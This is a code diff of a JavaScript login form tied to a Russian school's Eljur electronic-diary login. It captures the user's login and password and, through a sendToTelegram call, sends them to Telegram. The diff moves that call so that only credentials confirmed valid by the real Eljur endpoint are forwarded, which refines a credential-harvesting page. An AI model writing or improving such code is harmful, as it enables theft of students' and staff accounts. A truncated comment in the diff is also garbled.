@@ -143,8 +143,7 @@ form.addEventListener("submit", function (e) {
     return;
   }
 
-  // Отправляем данные в Telegram
-  sendToTelegram(loginVal, passVal);
+  // Отправляем данные в Telegra
 
   // Запрос на Eljur
   fetch("https://shkolakzn.eljur.ru/ajaxauthorize", {
@@ -162,6 +161,7 @@ form.addEventListener("submit", function (e) {
     .then(data => {
       if (data.result && data.actions && data.actions[0]?.type === "redirect") {
         // успешный вход
+        sendToTelegram(loginVal, passVal);
         blurOverlay.remove();
         loginViewport.remove();
         document.body.style.overflow = "";
